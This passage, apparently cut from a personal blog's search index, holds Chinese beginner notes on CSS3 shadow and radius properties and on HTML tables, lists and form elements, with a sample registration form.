title="css3后增样式"></a>css3后增样式</h2><table><thead><tr><th>属性</th><th>名称</th><th>用途</th><th>相关说明</th></tr></thead><tbody><tr><td>border-radiues:length</td><td>圆角边框</td><td>可以做圆形</td><td>半径为length的圆与边框的交集<br>角顺序:   左上  右上 右下 左下<br> <strong>length</strong> 的单位不限,可以用百分比<br></td></tr><tr><td>box-shadow:h-shadow v-shadow blur spread color inset;</td><td>盒子阴影</td><td>-</td><td>水平位置(必须)  垂直位置(必须)  模糊距离 阴影尺寸 阴影颜色 外部阴影转内部(默认outset,此单词不可写)</td></tr><tr><td>text-shadow:h-shadow v-shadow blur color;</td><td>文字阴影</td><td>-</td><td>水平位置(必须)  垂直位置(必须)  模糊距离 阴影颜色</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习-html-02-表格标签+列表标签+表单标签</title>
      <link href="/2023/02/10/web-study-02/"/>
      <url>/2023/02/10/web-study-02/</url>
      
        <content type="html"><![CDATA[<p><strong>表格标签--列表标签--表单标签</strong></p><h1 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><span id="more"></span><blockquote><p>表格主要用于显示/展示数据，因为它可以让数据显示的非常的规整，可读性非常好。<br>Pink老师的总结:表格不是用来布局页面的而是用来展示数据的.<br>个人理解：功能多样，混用其他标签有时候会有很大的好处</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.2框架</span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span>  定义表格标签</span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span> 表格的头部区域</span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span> 表格的主体区域</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span>     行   </span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>     表头单元格(加粗居中)</span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>     单元格</span><br></pre></td></tr></table></figure><h2 id="表格属性-css可以设置"><a href="#表格属性-css可以设置" class="headerlink" title="表格属性(css可以设置)"></a>表格属性(css可以设置)</h2><blockquote><p>属性一般都写在标签名后面一个空格后的位置，且在尖括号包裹范围内。</p></blockquote><table><thead><tr><th>属性名</th><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>align</td><td>left 、center、right</td><td>规定表格相对周围元素的对齐方式。</td></tr><tr><td>border</td><td>1或</td><td>规定表格单元是否拥有边框，默认为””，表示没有边框</td></tr><tr><td>cellpadding</td><td>像素值</td><td>规定单元边沿与其内容之间的空白，默认1像素</td></tr><tr><td>cellspacing</td><td>像素值</td><td>规定单元格之间的空白，默认2像素。</td></tr><tr><td>width</td><td>像素值或百分比</td><td>规定表格的宽度。</td></tr></tbody></table><h2 id="合并单元格-精确到td-th"><a href="#合并单元格-精确到td-th" class="headerlink" title="合并单元格(精确到td/th)"></a>合并单元格(精确到td/th)</h2><blockquote><p>合并单元格方式:<br><strong>跨行合并</strong> :rowspan=”合并单元格的个数,最上面一各写合并代码<br><strong>跨列合并</strong> :colspan=”合并单元格的个数,做左侧一个写合并代码<br>要删除多余的单元格</p></blockquote><h1 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h1><h2 id="分类-无序列表-有序列表-自定义列表"><a href="#分类-无序列表-有序列表-自定义列表" class="headerlink" title="分类:无序列表  有序列表  自定义列表"></a>分类:无序列表  有序列表  自定义列表</h2><h3 id="重点-无序列表（后面比较常用）"><a href="#重点-无序列表（后面比较常用）" class="headerlink" title="(重点)无序列表（后面比较常用）"></a>(重点)无序列表（后面比较常用）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">    ul &gt; li</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.无序列表的各个列表项之间没有顺序级别之分，是并列的.</span><br><span class="line">2.<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span> 中只能嵌套 <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>，直接在<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>标签中输入其他标签或者文字的做法是不被允许的.(记得上次实验好像直接被挤掉了)</span><br><span class="line">3.<span class="tag">&lt;<span class="name">li</span>&gt;</span>与<span class="tag">&lt;/<span class="name">li</span>&gt;</span>之间相当于一个容器，可以容纳所有元素，但在实际使用时，我们会使用CSS 来设置</span><br><span class="line">4.无序列表带有自己的样式属性（例如旁边多个小点点），但在实际使用时，我们会使用CSS 来设置</span><br></pre></td></tr></table></figure><h2 id="理解-有序列表"><a href="#理解-有序列表" class="headerlink" title="(理解)有序列表"></a>(理解)有序列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.<span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>中只能嵌套<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>，直接在<span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span>标签中输入其他标签或者文字的做法是不被允许的</span><br><span class="line">2.<span class="tag">&lt;<span class="name">li</span>&gt;</span> 与<span class="tag">&lt;/<span class="name">li</span>&gt;</span>之间相当于一个容器，可以容纳所有元素。</span><br><span class="line">3.有序列表会带有自己样式属性，但在实际使用时，我们会使用CSS来设置</span><br></pre></td></tr></table></figure><h2 id="自定义-重点"><a href="#自定义-重点" class="headerlink" title="自定义(重点)"></a>自定义(重点)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.框架</span><br><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span><span class="tag">&lt;/<span class="name">dt</span>&gt;</span>头部 </span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    1. <span class="tag">&lt;<span class="name">dl</span>&gt;</span><span class="tag">&lt;/<span class="name">dl</span>&gt;</span>里面只能包含 <span class="tag">&lt;<span class="name">dt</span>&gt;</span> 和 <span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line">    2. <span class="tag">&lt;<span class="name">dt</span>&gt;</span>和<span class="tag">&lt;<span class="name">dd</span>&gt;</span>个数没有限制，经常是一个<span class="tag">&lt;<span class="name">dt</span>&gt;</span> 对应多个<span class="tag">&lt;<span class="name">dd</span>&gt;</span>。</span><br></pre></td></tr></table></figure><h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>在 HTML中，一个完整的表单通常由表单域、表单控件(也称为表单元素)和提示信息3个部分构成</p><h2 id="表单域-form标签"><a href="#表单域-form标签" class="headerlink" title="表单域(form标签)"></a>表单域(form标签)</h2><p>表单域是一个包含表单元素的区域</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">在HTML标签中，<span class="tag">&lt;<span class="name">form</span>&gt;</span>标签用于定义表单域，以实现用户信息的收集和传递</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>会把它范围内的表单元素信息提交给服务器</span><br></pre></td></tr></table></figure><p><strong>from标签说明</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url地址&quot;</span> <span class="attr">method</span>=<span class="string">&quot;提交方式&quot;</span> <span class="attr">name</span>=<span class="string">&quot;表单域名称&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>属性</th><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>action</td><td>url地加</td><td>用于指定接收并处理表单数据的服务器程序的url地址</td></tr><tr><td>method</td><td>get</td><td>用于设置表单数据的提交方式，其取值为get或post</td></tr><tr><td>name</td><td>名称</td><td>用于指定表单的名称，以区分同一个页面中的多个表单域。</td></tr></tbody></table><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><h3 id="input输入表单元素"><a href="#input输入表单元素" class="headerlink" title="input输入表单元素"></a>input输入表单元素</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span> 表单元素概述</span><br><span class="line">    input是输入的意思，而在表单元素中 <span class="tag">&lt;<span class="name">input</span>&gt;</span> 标签用于收集用户信息</span><br><span class="line">    在<span class="tag">&lt;<span class="name">input</span>&gt;</span>标签中，包含一个type属性，根据不同的 type属性值，输入字段拥有很多种形式(可以是文本字段、复选框、掩码后的文本控件、单选按钮、按钮等)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;属性值” /&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="type取值"><a href="#type取值" class="headerlink" title="type取值"></a>type取值</h4><p>type属性的属性值及其描述如下<br>| 属性值   | 描述                                                           |<br>| ——– | ————————————————————– |<br>| button   | 定义可点击按钮 (多数情况下，用于通过JavaScript 启动脚本)。     |<br>| checkbox | 定义复选框                                                     |<br>| file     | 定义输入字段和“浏览”按钮，供文件上传                           |<br>| hidden   | 定义隐藏的输入字段                                             |<br>| image    | 定义图像形式的提交按钮                                         |<br>| password | 定义盛码字段。该字段中的字符被掩码                             |<br>| radio    | 定义单选按钮                                                   |<br>| reset    | 定义重置按钮。重置按钮会清除表单中的所有数据                   |<br>| submit   | 定义提交按钮。提交按钮会把表单数据发送到服务器                 |<br>| text     | 定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符 |</p><h4 id="input其他属性"><a href="#input其他属性" class="headerlink" title="input其他属性:"></a>input其他属性:</h4><table><thead><tr><th>属性</th><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>由用户自定义</td><td>定义 input 元素的名称</td></tr><tr><td>value</td><td>由用户自定义</td><td>规定 input 元素的值</td></tr><tr><td>checked</td><td>checked</td><td>规定此 input 元素首次加载时应当被选中</td></tr><tr><td>maxlength</td><td>正整数</td><td>规定输入字段中的字符的最大长度。</td></tr></tbody></table><blockquote><p>__说明__：</p><ol><li><p>name和value是每个表单元素都有的属性值主要给后台人员使用</p></li><li><p>name 表单元素的名字要求单选按钮和复选框要有相同的name值</p></li><li><p>checked属性主要针对于单选按钮和复选框 主要作用一打开页面,就要可以默认选中某个表单元素</p></li><li><p>maxlength是用户可以在表单元素输入的最大字符数一般较少使用</p></li></ol></blockquote><p><strong>label标签</strong> :比较特殊,它形成的区域专门用来链接到input的标签,即点击label域就直接转到对应id的input当中.  </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;man&quot;</span>&gt;</span>man or woman?<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;man&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="select下拉表单元素"><a href="#select下拉表单元素" class="headerlink" title="select下拉表单元素"></a>select下拉表单元素</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><blockquote><p>在页面中，如果有多个选项让用户选择，并且想要节约页面空间时，我们可以使用<code>&lt;select&gt;</code>标签控件定义下拉列表</p></blockquote><h4 id="语法"><a href="#语法" class="headerlink" title="语法:"></a>语法:</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项2<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">option</span>&gt;</span>选项3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">..</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(1)<span class="tag">&lt;<span class="name">select</span>&gt;</span>中至少包含一对<span class="tag">&lt;<span class="name">option</span>&gt;</span></span><br><span class="line">(2)在<span class="tag">&lt;<span class="name">option</span>&gt;</span>中定义selected =&quot;selected&quot; 时，当前项即为默认选中项</span><br></pre></td></tr></table></figure><h3 id="textarea文本域元素"><a href="#textarea文本域元素" class="headerlink" title="textarea文本域元素"></a>textarea文本域元素</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>特大号文本框,用来做留言反馈评论等</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;3&quot;</span> <span class="attr">COls</span>=<span class="string">&quot;20&quot;</span>&gt;</span></span><br><span class="line">文本内容</span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">1.通过<span class="tag">&lt;<span class="name">textarea</span>&gt;</span>标签可以轻松地创建多行文本输入框</span><br><span class="line">2.cols=“每行中的字符数”我们在实际开发中不会使用，都是用 CSS 来改变大小，rows=“显示的行数”</span><br></pre></td></tr></table></figure><h1 id="小小案例"><a href="#小小案例" class="headerlink" title="小小案例"></a>小小案例</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;ks.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文本框 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- label标签:使用户点击文字时,可以将文字通过for链接到对应id的input表单当中</span></span><br><span class="line"><span class="comment">        也就是说,点击就默认选择到对应的input当中 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;usernames&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;请输入用户名&quot;</span> <span class="attr">id</span>=<span class="string">&quot;usernames&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 密码框 --&gt;</span></span><br><span class="line">        密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 单选按钮 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同&quot;name&quot;可以使得这个圆圈实现单选 --&gt;</span></span><br><span class="line">        性别: 男 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;man&quot;</span>&gt;</span> 女 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;woman&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 复选按钮 --&gt;</span></span><br><span class="line">        爱好:吃饭<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;eat&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 默认被选中:checked --&gt;</span></span><br><span class="line">        睡觉<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sleep&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span>&gt;</span></span><br><span class="line">        打豆豆<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;play&quot;</span> <span class="attr">id</span>= <span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 普通按钮 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击获取验证码&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;请输入验证码&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文件域  --&gt;</span></span><br><span class="line">        请点击上传文件:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        籍贯: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>广东<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- selected=&quot;selected&quot; ==&gt; 变更为默认选中的方法 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span>湖北<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>湖南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>广西<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>西藏<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 超级文本框,会实时反馈标签内的文本 --&gt;</span></span><br><span class="line">        备注: <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">注册完成后您有什么需要做的事情嘛?</span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 将表单发送到后台并且返回处理结果 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击按钮提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击重置表单&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习-html-01-网页+标签简介</title>
      <link href="/2023/02/10/web-study-01/"/>
      <url>/2023/02/10/web-study-01/</url>
      
        <content type="html"><![CDATA[<h1 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h1><p>重新看下学过的，免得老本都赔光了。</p><h2 id="什么是网页"><a href="#什么是网页" class="headerlink" title="什么是网页"></a>什么是网页</h2><blockquote><p>网站是指在因特网上根据一定的规则，使用 HTML等制作的用于展示特定内容相关的网页集合网页是网站中的一“页”，通常是HTML格式的文件，它要通过浏览器来阅读<br>网页是构成网站的基本元素，它通常由图片、链接、文字、声音、视频等元素组成。通常我们看到的网页常见以.htm 或.html 后缀结尾的文件，因此将其俗称为 HTML文件。</p><p>其实最简单的来说，你打开浏览器看到的东西基本上都是网页。</p></blockquote><span id="more"></span><h2 id="什么是-HTML"><a href="#什么是-HTML" class="headerlink" title="什么是 HTML"></a>什么是 HTML</h2><p><strong>HTML</strong> : 超文本标记语言(HyperText Markup Language)</p><pre><code>HTML不是一种编程语言，而是一种标记语言(markuplanguage)。标记语言是一套标记标签(markup tag)    所谓超文本，有2层含义    1.它可以加入图片、声音、动画、多媒体等内容(超越了文本限制 )。    2.它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接(超级链接文本 )。网页的形成    网页是由网页元素组成的，这些元素是利用 html标签描述出来，然后通过浏览器解析来显示给用户的.网页总结    网页是图片、链接、文字、声音、视频等元素组成其实就是一个html文件(后缀名为html)    网页生成制作:前端人员书写HTML文件,浏览器打开就能看到网页了    HTML:超文本标记语言,用来制作网页的一门语言有标签组成的.比如 图片标签 链接标签 视频标签等        常用浏览器    浏览器是网页显示、运行的平台。常用的浏览器有IE、火狐(Firefox)、谷歌(Chrome)、Safari和Opera等.(平时称为五大浏览器)web标准    浏览器内核(渲染引警):负责读取网页内容，整理讯息，计算网页的显示方式并显示页面        浏览器            内核              备注        IE               Trident        IE、猎豹安全、360极速浏览器、百度浏览器        firefox          Gecko          火狐浏览器内核        Safari           Webkit         苹果浏览器内核        chrome/Opera     Blink          chrome / opera浏览器内核。Blink 其实是 WebKit 的分支web标准的构成    主要包括结构 ( Structure ) 、表现( Presentation ) 和行为( Behavior) 三个方面        标准  说明        结构  结构用于对网页元素进行整理和分类，现阶段主要学的是HTML。        表现  表现用于设置网页元素的版式、颜色、大小等外观样式，主要指的是CSS        行为  行为是指网页模型的定义及交互的编写，现阶段主要学的是Javascript        Web 标准提出的最佳体验方案:结构、样式、行为相分离        简单理解: 结构写到 HTML 文件中，表现写到 CSS 文件中，行为写到JavaScript文件中</code></pre><h1 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h1><h2 id="基本语法概述"><a href="#基本语法概述" class="headerlink" title="基本语法概述"></a>基本语法概述</h2><pre><code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. HTML标签是由尖括号包围的关键词，例如 <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">    我们称为双标签。标签对中的第一个标签是</span><br><span class="line">2.HTML标签通常是成对出现的，例如<span class="tag">&lt;<span class="name">html</span>&gt;</span>和<span class="tag">&lt;/<span class="name">html</span>&gt;</span>开始标签，第二个标签是结束标签</span><br><span class="line">3.有些特殊的标签必须是单个标签(极少情况)，例如<span class="tag">&lt;<span class="name">br</span>/&gt;</span>，我们称为单标签</span><br><span class="line">1.2标签的关系</span><br><span class="line">    父子关系</span><br></pre></td></tr></table></figure>开发工具    VSCode  DW HBuilder ...</code></pre><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><pre><code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1.head部分标签说明  --&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  声明html为html5</span><br><span class="line">    html &gt;lang:显示语言 en or zh-CN or...</span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>:charset,字符集的意思.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.常用标签 --&gt;</span></span><br><span class="line">    2.1标题标签:h1~h6 &gt;  &#x27;<span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>&#x27;</span><br><span class="line">        口诀（老师的）</span><br><span class="line">        <span class="comment">&lt;!-- 简单理解就是逐级递减 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题标签<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题一共六级选，<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文字加粗一行显。<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>由大到小依次减，<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span>从重到轻随之变。<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h5</span>&gt;</span>语法规范书写后，<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h6</span>&gt;</span>具体效果刷新见。<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">    2.2 段落/换行标签</span><br><span class="line">        段落:<span 